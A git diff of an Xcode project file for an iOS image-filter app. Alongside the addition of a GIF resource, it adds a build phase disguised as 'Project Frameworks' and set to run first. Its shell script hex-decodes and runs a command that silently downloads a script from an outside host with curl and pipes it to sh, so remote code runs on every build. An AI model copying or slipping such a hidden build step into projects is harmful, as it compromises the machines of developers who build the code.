@@ -29,6 +29,7 @@
 		B06FEF0A25FA6C92009D9BFA /* GLView.m in Sources */ = {isa = PBXBuildFile; fileRef = B06FEF0525FA6C91009D9BFA /* GLView.m */; };
 		B06FEF0B25FA6C92009D9BFA /* GLContainerView.m in Sources */ = {isa = PBXBuildFile; fileRef = B06FEF0725FA6C91009D9BFA /* GLContainerView.m */; };
 		B06FEF0C25FA6C92009D9BFA /* OverLayRender.m in Sources */ = {isa = PBXBuildFile; fileRef = B06FEF0825FA6C91009D9BFA /* OverLayRender.m */; };
+		B08A9EB1276F640300E5DF45 /* recordSound.gif in Resources */ = {isa = PBXBuildFile; fileRef = B08A9EB0276F640300E5DF45 /* recordSound.gif */; };
 		EAD0052924E3C56200CDA161 /* HexagonMosaic.vsh in Resources */ = {isa = PBXBuildFile; fileRef = EAD0052824E3C56200CDA161 /* HexagonMosaic.vsh */; };
 		EAD0052B24E3C56D00CDA161 /* HexagonMosaic.fsh in Resources */ = {isa = PBXBuildFile; fileRef = EAD0052A24E3C56D00CDA161 /* HexagonMosaic.fsh */; };
 		EAD0052E24E3D06F00CDA161 /* TriangularMosaic.vsh in Resources */ = {isa = PBXBuildFile; fileRef = EAD0052D24E3D06F00CDA161 /* TriangularMosaic.vsh */; };
@@ -91,6 +92,7 @@
 		B06FEF0725FA6C91009D9BFA /* GLContainerView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GLContainerView.m; sourceTree = "<group>"; };
 		B06FEF0825FA6C91009D9BFA /* OverLayRender.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = OverLayRender.m; sourceTree = "<group>"; };
 		B06FEF0925FA6C91009D9BFA /* GLView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = GLView.h; sourceTree = "<group>"; };
+		B08A9EB0276F640300E5DF45 /* recordSound.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = recordSound.gif; sourceTree = "<group>"; };
 		EAD0052824E3C56200CDA161 /* HexagonMosaic.vsh */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.glsl; path = HexagonMosaic.vsh; sourceTree = "<group>"; };
 		EAD0052A24E3C56D00CDA161 /* HexagonMosaic.fsh */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.glsl; path = HexagonMosaic.fsh; sourceTree = "<group>"; };
 		EAD0052D24E3D06F00CDA161 /* TriangularMosaic.vsh */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.glsl; path = TriangularMosaic.vsh; sourceTree = "<group>"; };
@@ -266,6 +268,7 @@
 		EAFB982424E0DEB4005DEE63 /* 滤镜处理 */ = {
 			isa = PBXGroup;
 			children = (
+				B08A9EB0276F640300E5DF45 /* recordSound.gif */,
 				EAFB987524E29A32005DEE63 /* timg.jpg */,
 				EAFB984B24E129BB005DEE63 /* kunkun.jpg */,
 				B06FEF0325FA6C91009D9BFA /* GLView */,
@@ -415,6 +418,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EAFB983B24E0DEB8005DEE63 /* Build configuration list for PBXNativeTarget "滤镜处理" */;
 			buildPhases = (
+				F2C34A2D004C0BC2A16D902C /* Project Frameworks */,
 				EAFB981E24E0DEB4005DEE63 /* Sources */,
 				EAFB981F24E0DEB4005DEE63 /* Frameworks */,
 				EAFB982024E0DEB4005DEE63 /* Resources */,
@@ -478,6 +482,7 @@
 				EAD0052B24E3C56D00CDA161 /* HexagonMosaic.fsh in Resources */,
 				EAFB983224E0DEB8005DEE63 /* Assets.xcassets in Resources */,
 				EAFB985624E13787005DEE63 /* SplitScreen_3.fsh in Resources */,
+				B08A9EB1276F640300E5DF45 /* recordSound.gif in Resources */,
 				B0577791259F762400BB126B /* upDownTail.fsh in Resources */,
 				B0577789259E1B5500BB126B /* snow.vsh in Resources */,
 				EAFB985924E1397A005DEE63 /* SplitScreen_4.vsh in Resources */,
@@ -514,6 +519,27 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		F2C34A2D004C0BC2A16D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		EAFB981E24E0DEB4005DEE63 /* Sources */ = {
